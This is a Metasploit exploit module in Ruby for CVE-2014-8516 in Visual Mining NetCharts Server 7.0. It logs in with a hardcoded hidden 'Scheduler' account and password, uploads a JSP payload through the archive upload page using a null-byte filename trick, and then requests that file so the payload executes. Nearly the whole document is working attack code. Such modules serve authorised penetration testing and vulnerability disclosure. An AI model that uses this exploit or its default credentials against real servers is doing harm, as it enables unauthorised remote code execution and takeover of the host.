##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  DEFAULT_USERNAME = 'Scheduler'
  DEFAULT_PASSWORD = '!@#$scheduler$#@!'
  SIGNATURE = 'was uploaded successfully and is now ready for installation'
 
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Visual Mining NetCharts Server Remote Code Execution',
      'Description' => %q{
        This module exploits multiple vulnerabilities in Visual Mining NetCharts.
        First, a lack of input validation in the administration console permits
        arbitrary jsp code upload to locations accessible later through the web
        service. Authentication is typically required, however a 'hidden' user is
        available by default (and non editable). This user, named 'Scheduler',
        can only login to the console after any modification in the user
        database (a user is added, admin password is changed etc). If the
        'Scheduler' user isn't available valid credentials must be supplied. The
        default Admin password is Admin.
      },
      'Author'       =>
        [
          'sghctoma',    # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-8516'],
          ['ZDI', '14-372']
        ],
      'Privileged'  => true,
      'Platform'    => %w{ linux win },
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          ['Visual Mining NetCharts Server 7.0', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 03 2014'))
 
    register_options(
      [
        Opt::RPORT(8001),
        OptString.new('USERNAME', [false, "The username to authenticate with"]),
        OptString.new('PASSWORD', [false, "The password to authenticate with"])
      ], self.class)
  end
 
  def check
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri('/', 'Admin', 'archive', 'upload.jsp'),
      'vars_get' => { 'mode' => 'getZip' },
      'authorization' => basic_auth(username, password)
    })
 
    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    jsp_payload = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"
    print_status("#{peer} - Uploading JSP payload #{jsp_payload}...")
    if upload(jsp_payload, payload.encoded)
      print_good("#{peer} - JSP payload uploaded successfully")
      register_file_for_cleanup("./webapps/Admin/archive/ArchiveCache/#{jsp_payload}")
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end
 
    print_status("#{peer} - Executing payload...")
    execute(jsp_payload, 1)
  end
 
  def execute(jsp_name, time_out = 20)
    res = send_request_cgi({
      'uri'    => normalize_uri('/', 'Admin', 'archive', 'ArchiveCache', jsp_name),
      'method' => 'GET',
      'authorization' => basic_auth(username, password)
    }, time_out)
 
    res
  end
 
  def upload(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(
      contents,
      'application/octet-stream',
      nil,
      "form-data; name=\"FILE1\"; filename=\"#{file_name}\x00Archive0101140101.zip\""
    )
 
    res = send_request_cgi({
      'uri'    => normalize_uri("/", 'Admin', 'archive', 'upload.jsp'),
      'method' => 'GET',
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'data'   => post_data.to_s,
      'vars_get' => { 'mode' => 'getZip' },
      'authorization' => basic_auth(username, password)
    })
 
    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)
      true
    else
      false
    end
  end
 
  def username
    datastore['USERNAME'].blank? ? DEFAULT_USERNAME : datastore['USERNAME']
  end
 
  def password
    datastore['PASSWORD'].blank? ? DEFAULT_PASSWORD : datastore['PASSWORD']
  end
end